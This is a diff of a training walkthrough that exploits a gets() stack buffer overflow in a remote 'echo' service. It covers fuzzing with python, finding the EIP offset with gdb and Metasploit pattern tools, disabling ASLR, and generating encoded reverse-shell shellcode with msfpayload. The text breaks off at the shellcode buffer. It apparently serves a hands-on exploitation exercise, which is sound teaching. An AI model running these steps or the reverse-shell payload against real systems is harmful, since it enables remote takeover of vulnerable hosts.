@@ -4,25 +4,30 @@ This is a basic buffer overflow using `gets()` and served remotely over xinetd.
 
 The following is a walkthrough for the creation of the your exploit. There are plenty of tutorials available on the Internet which cover program execution, stack layout and function prolog and epilog. It is suggested that you consult Google if you are unfamiliar with basic stack layout.
 
-It is recommended that you pull the gdbinit file at `https://github.com/Nildram/Gdbinit` with `git clone https://github.com/Nildram/Gdbinit.git`.
+Before starting I'd also recommended that you pull the gdbinit file at `https://github.com/Nildram/Gdbinit` with:
 
-You will also need to disable ASLR support on your own machine with `echo 0 > /proc/sys/kernel/randomize_va_space`.
+```
+root@kali:~# git clone https://github.com/Nildram/Gdbinit.git
+root@kali:~# cp Gdbinit/gdbinit ~/.gdbinit
+```
 
-**_Note that some of the values presented here WILL be different from those calculated when exploiting the binary provided in the face to face._**
+For this walkthrough you will also need to disable ASLR support on your own machine with `echo 0 > /proc/sys/kernel/randomize_va_space`.
+
+**_Note that some of the values presented here WILL be different from those calculated when exploiting the binary provided in the face to face. This has been done on purpose so that you have to do some work rather than just being able to copy everything in here without thinking about it._**
 
 ## Step 1 - Identifying the Vulnerability
 
 The first step in exploit development is identifying a vulnerability. You already know this binary is vulnerable (and exploitable) otherwise you wouldn't be reading this. However, for the sake of this exercise, lets assume you don't already know. 
 
-There are two main approaches we might take in identifying this vulnerability; static analysis and dynamic analysis (fuzzing). 
+There are two main approaches we might take in identifying this vulnerability; manual analysis and fuzzing. 
 
-### Static Analysis:
+### Manual Analysis:
 
-Static analysis is the process of analysing the code without actually running it and is typically done with a decompiler or disassembler (IDA). If you're lucky you'll have access to the source code, which makes things much easier.
+Manual analysis is the process of analysing the code by hand in order to identify vulnerabilities and is typically done with a decompiler or disassembler (IDA) along with a debugger in some cases. If you're lucky you'll have access to the source code, which makes things much easier.
 
 In this case we have the source code and can see that there is an issue on line 17 where the gets() function is called. 
 
-```python
+```c
 void echo()
 {
     char buffer[BUFSIZE];
@@ -37,11 +42,11 @@ void echo()
 
 The gets() function reads input from the user and stores that input in the buffer provided as an argument. The important part to note is that the gets() function does not check the length of the input provided by the user or the destination buffer into which the input is copied. This means that, if the user provides input that exceeds the size of the destination buffer, it will overflow into the adjoining area of memory and overwrite the functions return address.
 
-### Dynamic Analysis
+### Fuzzing
 
-Dynamic analysis is the process of analysing the code whilst it is running. Typically dynamic analysis will be performed using a debugger or by fuzzing. The process of fuzzing involves repeatedly running the program with different input parameters in order to identify any bugs that may be triggered by unexpected user input.
+The process of fuzzing involves repeatedly running the program with different input in order to identify any bugs that may be triggered by unexpected data.
 
-From static analysis we can guess that the program will crash with an input greater than 256 bytes, but this value may differ depending on how much stack space the compiler allowed. We can use fuzzing to determine exactly how many bytes we need to input to break the application. We can fuzz the remote 'echo' application with a simple bit of python (remember to change the IP address):
+From static analysis we can guess that the program will crash with an input greater than 256 bytes, but this value may differ depending on how much stack space the compiler allowed. We can use fuzzing to determine exactly how many bytes we need to input to break the application. We can fuzz the remote 'echo' application with a simple bit of python:
 
 ```python
 #!/usr/bin/env python2
@@ -51,7 +56,7 @@ import sys
 import time
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.94.131", 7))
+sock.connect(("127.0.0.1", 7))
 
 data = "A" * 10
 
@@ -69,7 +74,7 @@ for i in range(1, 100):
     time.sleep(0.01)
 ```
 
-Running the script tells us that the process crashed after receiving 260 bytes of input (note that this will be different to the version at the face to face):
+Running the script tells us that the process crashed after receiving 260 bytes of input (note that this WILL be different to the version of the binary included in this repo):
 
 ```
 root@kali:~# ./fuzz.py 
@@ -79,7 +84,7 @@ Socket closed after sending 260 bytes
 
 ## Step 2 - Exploiting
 
-Now we can move on to exploiting a local copy of the application before going back to the challenge server. There are three things we need in order to successfully exploit the `echo` application:
+Now we can move on to exploiting a local copy of the application before going back to the challenge server (or your local server if that's where it's running). There are three things we need in order to successfully exploit the `echo` application:
 
 1. Control of the instruction pointer (EIP).
 2. Somewhere to put our shellcode.
@@ -87,7 +92,7 @@ Now we can move on to exploiting a local copy of the application before going ba
 
 ### EIP Control
 
-Let's start up gdb and run the application with our overflow data to see what's going on in the crash we caused with the remote fuzzer.
+Let's start up `gdb` and run the application with our overflow data to see what's going on in the crash we caused with the remote fuzzer.
 
 Note that the number of A's you use in the input will be different for the face to face version. Also note that if you're running kali-64, you will need to install the 32 libc libraries - `apt-get install libc6-dev-i386`.
 
@@ -112,6 +117,7 @@ We see that EIP contains the value `0x41414141` which is "AAAA" is ascii proving
 To do this we're going to use some of the exploit tools provided by metasploit:
 
 ```
+gdb$ q
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 270 > input
 root@kali:~# cat input 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9
@@ -120,6 +126,8 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 If we now run this input within GDB we see the following:
 
 ```
+root@kali:~# gdb ./echo -q
+Reading symbols from /root/echo...(no debugging symbols found)...done.
 gdb$ r < input 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9 -11280
 Program received signal SIGSEGV, Segmentation fault.
@@ -131,7 +139,7 @@ Cannot access memory at address 0x37694136
 0x37694136 in ?? ()
 ```
 
-Now we have the value `0x37694136` in EIP. Let's get the offset of this value within our input buffer:
+Now we have the value `0x37694136` in EIP. Let's get the offset of this value within our input buffer (note that we supply the value in EIP to the `pattern_offset.rb` script):
 
 ```
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37694136
@@ -155,7 +163,7 @@ Cannot access memory at address 0x0
 0x00000000 in ?? ()
 ```
 
-As expected, the value at EIP is 0x00000000. That's the first requirement of our exploit completed. Let's move on to adding some shellcode.
+As expected, the value at EIP is 0x00000000. That's the first requirement of our exploit completed so let's move on to adding some shellcode.
 
 ### Placing Shellcode
 
@@ -166,11 +174,10 @@ root@kali:~# readelf -l echo | grep STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 ```
 
-The `RWE` output tells us that the stack is readable, writable and executable so we're free to go ahead and use the stack to host our shellcode. Now let's go ahead and generate some shellcode for a reverse shell using metasploit (be sure to set the correct LHOST and LPORT for your own machine):
+The `RWE` output tells us that the stack is readable, writable and executable so we're free to go ahead and use the stack to host our shellcode. Now let's go ahead and generate some shellcode for a reverse shell using metasploit (be sure to update LHOST and LPORT as necessary):
 
 ```
-root@kali:~# msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.94.133 PORT=4444 R | 
-msfencode -b '\x0a\x04' -e x86/shikata_ga_nai -t c
+root@kali:~# msfpayload linux/x86/shell_reverse_tcp LHOST=127.0.0.1 PORT=4444 R | msfencode -b '\x0a\x04' -e x86/shikata_ga_nai -t c
 [*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)
 
 unsigned char buf[] = 
